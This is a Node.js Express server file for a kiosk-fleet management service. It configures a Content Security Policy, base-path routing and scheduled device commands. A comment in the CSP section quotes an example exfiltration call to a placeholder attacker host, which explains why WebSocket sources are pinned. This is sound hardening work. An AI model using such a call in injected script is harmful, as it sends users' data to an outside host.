import http from 'node:http';
import path from 'node:path';
import fs from 'node:fs';
import express from 'express';
import helmet from 'helmet';
import cookieParser from 'cookie-parser';
import { config } from './config.js';
import { db } from './db.js';
import { ensureSeed } from './seed.js';
import { attachHub } from './hub.js';
import authRoutes from './routes/auth.js';
import deviceRoutes from './routes/devices.js';
import linkRoutes from './routes/links.js';
import clientRoutes from './routes/clients.js';
import templateRoutes from './routes/templates.js';
import adminRoutes from './routes/admin.js';
import agentRoutes from './routes/agent.js';
import { issueCommand } from './commands.js';
import { parseTimeToMinutes, desiredScreenState, minutesSinceMidnight } from './schedule.js';

ensureSeed();

const app = express();
app.set('trust proxy', 1);

// The pages here carry more30's shared login pill
// (<script src="https://more30.com/auth-button.js">), and that pill is not only
// a badge: the one call it makes on load records the visitor as a customer of
// this system and asks the server whether to offer "ניהול". Under a policy that
// does not name the platform API, both requests are refused before they leave
// the page — the pill still renders and still shows the signed-in name, so the
// failure is completely invisible from the outside. Measured on 06/08:
// more30.com/kiosk was the only mount of twenty-one where that fetch could not
// complete (scripts/qa/csp-blocks-auth.mjs in the more30 monorepo).
//
// Both entries are the platform's own origins and nothing wider: the API host
// for the calls, and more30.com for the script itself. 'self' happens to cover
// the script today only because the page is served at more30.com/kiosk — on
// this service's own hostname it is a different origin and would be blocked.
const PLATFORM_API = 'https://uhnrgujbdxhhmoxcjria.supabase.co';
const PLATFORM_ORIGIN = 'https://more30.com';

// connect-src for the realtime socket. A bare `ws:`/`wss:` scheme source
// matches a WebSocket to ANY host, not just this app's own hub — with
// script-src already carrying 'unsafe-inline' (required for the inline
// theme/password-toggle scripts), that turned connect-src into an open
// exfiltration channel for any future injection: `new WebSocket('wss://
// attacker.example')` would be explicitly CSP-allowed. Once WS_HOST is known
// (every real deployment sets it — see config.wsHost's own comment) it is a
// fixed hostname decided at boot, not a per-request value, so it can be
// pinned exactly. Only the local/same-host fallback (WS_HOST unset) keeps the
// broad scheme sources, unchanged from before.
const wsConnectSrc = config.wsHost ? [`wss://${config.wsHost}`, `ws://${config.wsHost}`] : ['ws:', 'wss:'];

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", PLATFORM_ORIGIN],
      styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'", ...wsConnectSrc, PLATFORM_API],
    },
  },
}));
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());

const base = config.basePath;

// Health stays at the true root as well as under the prefix: Railway's
// healthcheck hits the container directly and knows nothing about /kiosk.
const health = (req, res) => res.json({ ok: true, time: new Date().toISOString(), basePath: base || '/' });
app.get('/api/health', health);

// A visitor who types more30.com/kiosk (no trailing slash) must land on the
// same page as more30.com/kiosk/ — the HTML uses document-relative asset URLs
// so that it works at any prefix, and those only resolve from the directory
// form. Registered before the mount so it wins the exact match.
//
// ⚠️ Not `app.get(base, …)`: with Express's default non-strict routing that
// route also matches `/kiosk/`, which redirects the directory form to itself
// forever. Comparing `req.path` exactly is what makes the two distinct.
if (base) {
  app.use((req, res, next) => {
    if (req.path !== base) return next();
    res.redirect(301, base + '/' + req.originalUrl.slice(req.path.length));
  });
  // The service also answers on its own hostname (the one the realtime socket
  // needs). Someone who types that hostname lands on "/", which is outside the
  // prefix and would otherwise 404 on a site that is plainly working.
  app.get('/', (req, res) => res.redirect(302, base + '/'));
}

const site = express.Router();

site.get('/api/health', health);

// Where the browser should open its realtime socket. The console cannot work
// this out for itself: it is served from more30.com/kiosk, but that path is a
// rewrite that will not carry a WebSocket upgrade, so "same host as the page"
// is the one answer that is definitely wrong in production.
site.get('/api/config', (req, res) =>
  res.json({ wsHost: config.wsHost || null, basePath: base || '' }));

site.use('/api/auth', authRoutes);
site.use('/api', deviceRoutes);
site.use('/api', linkRoutes);
site.use('/api', clientRoutes);
site.use('/api', templateRoutes);
site.use('/api/admin', adminRoutes);
site.use('/api/agent', agentRoutes);

// Search engines index the real site only. A staging deployment that gets
// indexed competes with production for the same queries and is very hard to
// walk back, so the block is the default and production is the exception.
site.get('/robots.txt', (req, res) => {
  res.type('text/plain').send(
    config.env === 'production'
      ? 'User-agent: *\nAllow: /\n'
      : 'User-agent: *\nDisallow: /\n',
  );
});

// Serve the marketing site + console (static, no build step).
site.use(express.static(config.publicDir, { extensions: ['html'] }));

// Serve the Hebrew docs (linked from the in-console guide), if present.
const docsDir = path.resolve(config.root, '../docs');
if (fs.existsSync(docsDir)) site.use('/docs', express.static(docsDir));

// SPA-ish fallback for the console.
site.get('/console', (req, res) => res.sendFile('console.html', { root: config.publicDir }));

app.use(base || '/', site);

const server = http.createServer(app);
attachHub(server);

// Mark devices offline if they miss heartbeats for too long.
setInterval(() => {
  db.prepare(`UPDATE devices SET online = 0
     WHERE online = 1 AND (last_seen IS NULL OR last_seen < datetime('now', ?))`)
    .run(`-${config.offlineAfterMinutes} minutes`);
}, 60_000);

// KIOSK_BUILD.md §9 "תזמון": devices with a business-hours window configured
// get an automatic screen_on/screen_off at the boundary, not just on request
// from the console. `schedule_last_state` dedupes: issueCommand() has no
// idempotency of its own, and without this a device already in the right
// state would be re-sent the same command every tick, spamming both the
// commands table and a live agent's socket. Runs against the server's own
// local clock, the same clock the open/close strings are entered against.
setInterval(() => {
  const rows = db.prepare(
    `SELECT * FROM devices WHERE schedule_enabled = 1
     AND schedule_open_time IS NOT NULL AND schedule_close_time IS NOT NULL`
  ).all();
  if (!rows.length) return;
  const nowMinutes = minutesSinceMidnight(new Date());
  for (const device of rows) {
    const openMinutes = parseTimeToMinutes(device.schedule_open_time);
    const closeMinutes = parseTimeToMinutes(device.schedule_close_time);
    if (openMinutes == null || closeMinutes == null) continue; // validated at write time; defensive only
    const desired = desiredScreenState(nowMinutes, openMinutes, closeMinutes);
    if (device.schedule_last_state === desired) continue;
    issueCommand(device, desired === 'on' ? 'screen_on' : 'screen_off', null, null);
    db.prepare('UPDATE devices SET schedule_last_state = ? WHERE id = ?').run(desired, device.id);
  }
}, 60_000);

server.listen(config.port, () => {
  console.log(`\n  KioskFleet server running (${config.env})`);
  console.log(`  → console : ${config.publicUrl}${base}/console`);
  console.log(`  → landing : ${config.publicUrl}${base}/`);
  console.log(`  → api     : ${config.publicUrl}${base}/api\n`);
});
